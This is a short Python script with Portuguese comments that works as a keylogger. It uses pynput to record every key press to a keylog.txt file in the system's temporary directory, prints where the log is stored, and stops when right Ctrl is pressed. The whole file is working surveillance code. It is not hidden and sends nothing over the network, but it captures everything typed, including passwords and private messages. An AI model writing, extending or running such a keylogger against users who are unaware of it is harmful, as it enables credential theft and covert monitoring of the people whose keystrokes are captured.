from pynput.keyboard import Listener, Key
import random
import sys
import os

def encerrar_programa():
    print("Programa encerrado!")
    sys.exit()

def escreve_key(key, log_file):
    try:
        with open(log_file, 'a') as file:
            file.write(f'{str(key)}\n')
    except Exception as e:
        print(f'Erro ao capturar a tecla {e}')
        encerrar_programa()
    if key == Key.ctrl_r:
        encerrar_programa()

# Obter o diretório temporário do sistema
temp_dir = os.getenv('TEMP')
if not temp_dir:
    print("Não foi possível encontrar o diretório temporário do sistema.")
    sys.exit(1)

# Construir o caminho completo para o arquivo de log no diretório temporário
log_file = os.path.join(temp_dir, 'keylog.txt')

print(f'As teclas estão sendo capturadas e registradas em: {log_file}')
with Listener(on_press=lambda key: escreve_key(key, log_file)) as logs:
    try:
        logs.join()
    except Exception as e:
        print('Erro durante a execução do programa')
    finally:
        logs.stop()
        encerrar_programa()
